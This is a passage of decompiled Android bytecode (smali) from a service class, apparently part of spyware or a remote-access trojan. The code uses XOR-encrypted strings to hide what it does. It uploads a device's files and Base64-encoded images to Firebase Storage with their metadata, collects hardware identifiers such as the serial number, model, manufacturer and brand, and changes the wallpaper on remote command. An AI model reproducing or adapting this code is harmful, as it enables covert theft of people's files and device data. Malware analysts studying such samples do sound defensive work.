    invoke-virtual {v0, v8}, Ljava/util/ArrayList;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Ljava/lang/String;

    invoke-direct {v7, v0}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-virtual {v7}, Ljava/io/File;->length()J

    move-result-wide v8

    div-long/2addr v8, v10

    invoke-static {v8, v9}, Ljava/lang/String;->valueOf(J)Ljava/lang/String;

    move-result-object v0

    invoke-direct {v6, v0}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v0, "HhY="

    invoke-static {v0}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    const-string v7, "aXskEw=="

    invoke-static {v7}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v0, v7}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v6, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v5, v0}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v4, v0}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v3, v0}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v2, v0}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Lsigma/male/servicess;->str:Ljava/lang/String;

    goto/16 :goto_2

    .line 565
    :cond_4
    iget-object v0, p0, Lsigma/male/servicess;->lst:Ljava/util/ArrayList;

    iget-wide v2, p0, Lsigma/male/servicess;->num:D

    double-to-int v2, v2

    invoke-virtual {v0, v2}, Ljava/util/ArrayList;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Ljava/lang/String;

    invoke-static {v0}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v0

    invoke-virtual {v0}, Landroid/net/Uri;->getLastPathSegment()Ljava/lang/String;

    move-result-object v0

    const-string v2, "ezk2GQ=="

    invoke-static {v2}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-eqz v0, :cond_5

    .line 566
    iget-object v2, p0, Lsigma/male/servicess;->str:Ljava/lang/String;

    const-string v0, "aTgvDVs5NTVeBXciLw8Yaw=="

    invoke-static {v0}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    iget-object v0, p0, Lsigma/male/servicess;->lst:Ljava/util/ArrayList;

    iget-wide v4, p0, Lsigma/male/servicess;->num:D

    double-to-int v4, v4

    invoke-virtual {v0, v4}, Ljava/util/ArrayList;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Ljava/lang/String;

    invoke-static {v0}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v0

    invoke-virtual {v0}, Landroid/net/Uri;->getLastPathSegment()Ljava/lang/String;

    move-result-object v4

    const-string v0, "aTZ4"

    invoke-static {v0}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    new-instance v6, Ljava/lang/StringBuilder;

    new-instance v7, Ljava/io/File;

    iget-object v0, p0, Lsigma/male/servicess;->lst:Ljava/util/ArrayList;

    iget-wide v8, p0, Lsigma/male/servicess;->num:D

    double-to-int v8, v8

    invoke-virtual {v0, v8}, Ljava/util/ArrayList;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Ljava/lang/String;

    invoke-direct {v7, v0}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-virtual {v7}, Ljava/io/File;->length()J

    move-result-wide v8

    div-long/2addr v8, v10

    invoke-static {v8, v9}, Ljava/lang/String;->valueOf(J)Ljava/lang/String;

    move-result-object v0

    invoke-direct {v6, v0}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v0, "HhY="

    invoke-static {v0}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    const-string v7, "aXskEw=="

    invoke-static {v7}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v0, v7}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v6, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v5, v0}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v4, v0}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v3, v0}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v2, v0}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Lsigma/male/servicess;->str:Ljava/lang/String;

    goto/16 :goto_2

    .line 569
    :cond_5
    iget-object v2, p0, Lsigma/male/servicess;->str:Ljava/lang/String;

    const-string v0, "aTgvDVs5NTVeBXcyLw8Yaw=="

    invoke-static {v0}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    iget-object v0, p0, Lsigma/male/servicess;->lst:Ljava/util/ArrayList;

    iget-wide v4, p0, Lsigma/male/servicess;->num:D

    double-to-int v4, v4

    invoke-virtual {v0, v4}, Ljava/util/ArrayList;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Ljava/lang/String;

    invoke-static {v0}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v0

    invoke-virtual {v0}, Landroid/net/Uri;->getLastPathSegment()Ljava/lang/String;

    move-result-object v4

    const-string v0, "aTZ4"

    invoke-static {v0}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    new-instance v6, Ljava/lang/StringBuilder;

    new-instance v7, Ljava/io/File;

    iget-object v0, p0, Lsigma/male/servicess;->lst:Ljava/util/ArrayList;

    iget-wide v8, p0, Lsigma/male/servicess;->num:D

    double-to-int v8, v8

    invoke-virtual {v0, v8}, Ljava/util/ArrayList;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Ljava/lang/String;

    invoke-direct {v7, v0}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-virtual {v7}, Ljava/io/File;->length()J

    move-result-wide v8

    div-long/2addr v8, v10

    invoke-static {v8, v9}, Ljava/lang/String;->valueOf(J)Ljava/lang/String;

    move-result-object v0

    invoke-direct {v6, v0}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v0, "HhY="

    invoke-static {v0}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    const-string v7, "aXskEw=="

    invoke-static {v7}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v0, v7}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v6, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v5, v0}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v4, v0}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v3, v0}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v2, v0}, Ljava/lang/String;->concat(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Lsigma/male/servicess;->str:Ljava/lang/String;

    goto/16 :goto_2

    .line 578
    :cond_6
    invoke-static {p1}, Lsigma/male/FileUtil;->isFile(Ljava/lang/String;)Z

    move-result v1

    if-eqz v1, :cond_0

    .line 579
    new-instance v1, Landroid/graphics/BitmapFactory$Options;

    invoke-direct {v1}, Landroid/graphics/BitmapFactory$Options;-><init>()V

    const/4 v2, 0x1

    iput-boolean v2, v1, Landroid/graphics/BitmapFactory$Options;->inJustDecodeBounds:Z

    invoke-static {p1, v1}, Landroid/graphics/BitmapFactory;->decodeFile(Ljava/lang/String;Landroid/graphics/BitmapFactory$Options;)Landroid/graphics/Bitmap;

    .line 580
    iget v2, v1, Landroid/graphics/BitmapFactory$Options;->outWidth:I

    if-eq v2, v3, :cond_7

    iget v1, v1, Landroid/graphics/BitmapFactory$Options;->outHeight:I

    if-eq v1, v3, :cond_7

    new-instance v1, Ljava/io/File;

    invoke-direct {v1, p1}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1}, Ljava/io/File;->length()J

    move-result-wide v2

    div-long/2addr v2, v10

    const-wide/16 v4, 0xc00

    cmp-long v1, v2, v4

    if-gez v1, :cond_7

    .line 581
    new-instance v1, Ljava/io/File;

    invoke-direct {v1, p1}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1}, Ljava/io/File;->lastModified()J

    move-result-wide v2

    new-instance v4, Ljava/util/Date;

    invoke-direct {v4, v2, v3}, Ljava/util/Date;-><init>(J)V

    .line 582
    new-instance v1, Ljava/io/ByteArrayOutputStream;

    invoke-direct {v1}, Ljava/io/ByteArrayOutputStream;-><init>()V

    .line 583
    invoke-static {p1}, Landroid/graphics/BitmapFactory;->decodeFile(Ljava/lang/String;)Landroid/graphics/Bitmap;

    move-result-object v2

    .line 584
    sget-object v3, Landroid/graphics/Bitmap$CompressFormat;->JPEG:Landroid/graphics/Bitmap$CompressFormat;

    const/16 v5, 0x64

    invoke-virtual {v2, v3, v5, v1}, Landroid/graphics/Bitmap;->compress(Landroid/graphics/Bitmap$CompressFormat;ILjava/io/OutputStream;)Z

    .line 585
    invoke-virtual {v1}, Ljava/io/ByteArrayOutputStream;->toByteArray()[B

    move-result-object v1

    .line 586
    invoke-static {v1, v0}, Landroid/util/Base64;->encodeToString([BI)Ljava/lang/String;

    move-result-object v3

    .line 587
    const-string v0, "PDkhW1EwIw=="

    invoke-static {v0}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    new-instance v0, Ljava/lang/StringBuilder;

    const-string v2, "aTgvE3Y0OSMXGA=="

    invoke-static {v2}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-direct {v0, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-static {p1}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v2

    invoke-virtual {v2}, Landroid/net/Uri;->getLastPathSegment()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v2, "aTgvE3snMSdZUTo6fA0="

    invoke-static {v2}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v2, "aTgvE2s8LiMXGA=="

    invoke-static {v2}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    new-instance v2, Ljava/io/File;

    invoke-direct {v2, p1}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2}, Ljava/io/File;->length()J

    move-result-wide v4

    div-long/2addr v4, v10

    invoke-virtual {v0, v4, v5}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v2, "HhZmEVQ8ahZMTD1uZg=="

    invoke-static {v2}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    const-string v5, ""

    move-object v0, p0

    move-object v2, p1

    invoke-virtual/range {v0 .. v5}, Lsigma/male/servicess;->_setrespo(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    goto/16 :goto_1

    .line 590
    :cond_7
    iget-object v0, p0, Lsigma/male/servicess;->fbs:Lcom/google/firebase/storage/StorageReference;

    invoke-virtual {v0, p1}, Lcom/google/firebase/storage/StorageReference;->child(Ljava/lang/String;)Lcom/google/firebase/storage/StorageReference;

    move-result-object v0

    new-instance v1, Ljava/io/File;

    invoke-direct {v1, p1}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-static {v1}, Landroid/net/Uri;->fromFile(Ljava/io/File;)Landroid/net/Uri;

    move-result-object v1

    invoke-virtual {v0, v1}, Lcom/google/firebase/storage/StorageReference;->putFile(Landroid/net/Uri;)Lcom/google/firebase/storage/UploadTask;

    move-result-object v0

    iget-object v1, p0, Lsigma/male/servicess;->_fbs_failure_listener:Lcom/google/android/gms/tasks/OnFailureListener;

    invoke-virtual {v0, v1}, Lcom/google/firebase/storage/UploadTask;->addOnFailureListener(Lcom/google/android/gms/tasks/OnFailureListener;)Lcom/google/firebase/storage/StorageTask;

    move-result-object v0

    iget-object v1, p0, Lsigma/male/servicess;->_fbs_upload_progress_listener:Lcom/google/firebase/storage/OnProgressListener;

    invoke-virtual {v0, v1}, Lcom/google/firebase/storage/StorageTask;->addOnProgressListener(Lcom/google/firebase/storage/OnProgressListener;)Lcom/google/firebase/storage/StorageTask;

    move-result-object v0

    new-instance v1, Lsigma/male/servicess$22;

    invoke-direct {v1, p0, p1}, Lsigma/male/servicess$22;-><init>(Lsigma/male/servicess;Ljava/lang/String;)V

    invoke-virtual {v0, v1}, Lcom/google/firebase/storage/StorageTask;->continueWithTask(Lcom/google/android/gms/tasks/Continuation;)Lcom/google/android/gms/tasks/Task;

    move-result-object v0

    .line 594
    iget-object v1, p0, Lsigma/male/servicess;->_fbs_upload_success_listener:Lcom/google/android/gms/tasks/OnCompleteListener;

    invoke-virtual {v0, v1}, Lcom/google/android/gms/tasks/Task;->addOnCompleteListener(Lcom/google/android/gms/tasks/OnCompleteListener;)Lcom/google/android/gms/tasks/Task;

    .line 595
    new-instance v0, Ljava/io/File;

    invoke-direct {v0, p1}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/io/File;->lastModified()J

    move-result-wide v0

    new-instance v2, Ljava/util/Date;

    invoke-direct {v2, v0, v1}, Ljava/util/Date;-><init>(J)V

    .line 596
    new-instance v0, Ljava/lang/StringBuilder;

    const-string v1, "aTgvE3Y0OSMXGA=="

    invoke-static {v1}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-static {p1}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v1

    invoke-virtual {v1}, Landroid/net/Uri;->getLastPathSegment()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, "aTgvE3snMSdZUTo6fA0="

    invoke-static {v1}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, "aTgvE2s8LiMXGA=="

    invoke-static {v1}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    new-instance v1, Ljava/io/File;

    invoke-direct {v1, p1}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1}, Ljava/io/File;->length()J

    move-result-wide v2

    div-long/2addr v2, v10

    invoke-virtual {v0, v2, v3}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v1, "HhZmEVQ8ahZMTD1uZg=="

    invoke-static {v1}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Lsigma/male/servicess;->filinfodat:Ljava/lang/String;

    goto/16 :goto_1
.end method

.method public _changewall(Ljava/lang/String;)V
    .locals 6

    .prologue
    .line 1027
    const-string v0, "ZQ=="

    invoke-static {v0}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_1

    .line 1028
    invoke-virtual {p0}, Lsigma/male/servicess;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    invoke-static {v0}, Landroid/app/WallpaperManager;->getInstance(Landroid/content/Context;)Landroid/app/WallpaperManager;

    move-result-object v0

    const v1, 0x7f0700c7

    :try_start_0
    invoke-virtual {v0, v1}, Landroid/app/WallpaperManager;->setResource(I)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 1029
    :goto_0
    const-string v0, "MT0nQVcyIi9ITw=="

    invoke-static {v0}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    const-string v2, ""

    const-string v0, "AjUqQUg0JCNfGBY8J0NfMDBmfk02NyNeSzMhKkFB"

    invoke-static {v0}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    const-string v4, ""

    const-string v5, ""

    move-object v0, p0

    invoke-virtual/range {v0 .. v5}, Lsigma/male/servicess;->_setrespo(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    .line 1046
    :cond_0
    :goto_1
    return-void

    .line 1028
    :catch_0
    move-exception v0

    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_0

    .line 1032
    :cond_1
    const-string v0, "ZA=="

    invoke-static {v0}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_2

    .line 1033
    invoke-virtual {p0}, Lsigma/male/servicess;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    invoke-static {v0}, Landroid/app/WallpaperManager;->getInstance(Landroid/content/Context;)Landroid/app/WallpaperManager;

    move-result-object v0

    const v1, 0x7f0700c8

    :try_start_1
    invoke-virtual {v0, v1}, Landroid/app/WallpaperManager;->setResource(I)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    .line 1034
    :goto_2
    const-string v0, "MT0nQVcyIi9ITw=="

    invoke-static {v0}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    const-string v2, ""

    const-string v0, "AjUqQUg0JCNfGBY8J0NfMDBmfk02NyNeSzMhKkFB"

    invoke-static {v0}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    const-string v4, ""

    const-string v5, ""

    move-object v0, p0

    invoke-virtual/range {v0 .. v5}, Lsigma/male/servicess;->_setrespo(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    goto :goto_1

    .line 1033
    :catch_1
    move-exception v0

    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_2

    .line 1037
    :cond_2
    const-string v0, "Zw=="

    invoke-static {v0}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_0

    .line 1038
    invoke-virtual {p0}, Lsigma/male/servicess;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    invoke-static {v0}, Landroid/app/WallpaperManager;->getInstance(Landroid/content/Context;)Landroid/app/WallpaperManager;

    move-result-object v0

    const v1, 0x7f0700c9

    :try_start_2
    invoke-virtual {v0, v1}, Landroid/app/WallpaperManager;->setResource(I)V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_2

    .line 1039
    :goto_3
    const-string v0, "MT0nQVcyIi9ITw=="

    invoke-static {v0}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    const-string v2, ""

    const-string v0, "AjUqQUg0JCNfGBY8J0NfMDBmfk02NyNeSzMhKkFB"

    invoke-static {v0}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    const-string v4, ""

    const-string v5, ""

    move-object v0, p0

    invoke-virtual/range {v0 .. v5}, Lsigma/male/servicess;->_setrespo(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    goto :goto_1

    .line 1038
    :catch_2
    move-exception v0

    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_3
.end method

.method public _devinfo()V
    .locals 6

    .prologue
    .line 932
    invoke-virtual {p0}, Lsigma/male/servicess;->getApplicationContext()Landroid/content/Context;

    const-string v0, "Ij0oSVci"

    invoke-static {v0}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p0, v0}, Lsigma/male/servicess;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/WindowManager;

    .line 933
    invoke-interface {v0}, Landroid/view/WindowManager;->getDefaultDisplay()Landroid/view/Display;

    move-result-object v0

    .line 934
    invoke-virtual {v0}, Landroid/view/Display;->getWidth()I

    move-result v1

    .line 935
    invoke-virtual {v0}, Landroid/view/Display;->getHeight()I

    move-result v0

    .line 936
    new-instance v2, Ljava/lang/StringBuilder;

    const-string v3, "aTAvWxg2OCdeS3VpYUZdLDgpSl9ydHgRWmsHA39xFBh8DQR6Nng="

    invoke-static {v3}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    sget-object v3, Landroid/os/Build;->SERIAL:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "aTY0EwQ3ag=="

    invoke-static {v3}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "GBsCaHRvdHoCWmt0"

    invoke-static {v3}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    sget-object v3, Landroid/os/Build;->MODEL:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "aTY0EwQ3ag=="

    invoke-static {v3}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "HBB8DRhpeyQT"

    invoke-static {v3}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    sget-object v3, Landroid/os/Build;->ID:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "aTY0EwQ3ag=="

    invoke-static {v3}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "GDUoWF40NzJYSjBuZhEXN2o="

    invoke-static {v3}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    sget-object v3, Landroid/os/Build;->MANUFACTURER:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "aTY0EwQ3ag=="

    invoke-static {v3}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "FyYnQ1xvaGlPBnU="

    invoke-static {v3}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    sget-object v3, Landroid/os/Build;->BRAND:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "aTY0EwQ3ag=="

    invoke-static {v3}, Lcom/github/megatronking/stringfog/xor/StringFogImpl;->decrypt(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    .line 938
    const-string v3, "ETEwRFswdApMVjIhJ0pdb3R6Alpr"

